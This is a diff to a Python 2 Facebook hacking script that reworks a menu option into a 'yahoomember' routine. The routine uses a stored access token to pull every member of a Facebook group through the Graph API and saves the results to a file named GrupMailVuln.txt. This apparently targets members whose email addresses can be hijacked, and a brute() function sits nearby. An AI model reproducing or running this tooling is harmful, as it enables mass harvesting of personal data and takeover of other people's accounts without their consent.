@@ -989,7 +989,7 @@ def pilih():
         elif unikers =="6":
 		test()
         elif unikers =="7":
-		clone_dari_member_group()
+		yahoomember()
         elif unikers =="8":
 		os.system('clear')
 		print logo
@@ -2976,40 +2976,39 @@ def pilih_super():
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
 
-def clone_dari_member_group():
+def yahoomember():
 	global toket
-	os.system('clear')
+	os.system('reset')
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		keluar()
+		login()
 	try:
 		os.mkdir('out')
 	except OSError:
 		pass
-	os.system('clear')
+	os.system('reset')
 	print logo
 	mpsh = []
 	jml = 0
-	print 42*"\033[1;96m♡"
-	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
+	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
 	try:
 		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
 		asw=json.loads(r.text)
-		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
 	except KeyError:
-		print"\033[1;96m[!] \x1b[1;91mGroup not found"
-		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-		menu()
-	jalan('\033[1;96m[✺] \033[1;93mGeting email \033[1;97m...')
+		print"\033[1;91m[!] Group not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_yahoo()
+	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
 	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
 	kimak = json.loads(teman.text)
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m☆"
+	save = open('out/GrupMailVuln.txt','w')
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
 	for w in kimak['data']:
 		jml +=1
 		mpsh.append(jml)
@@ -3044,7 +3043,8 @@ def clone_dari_member_group():
 	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
 	save.close()
 	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-	menu()
+	menu_yahoo()
+		
 		
 def brute():
     os.system('clear')
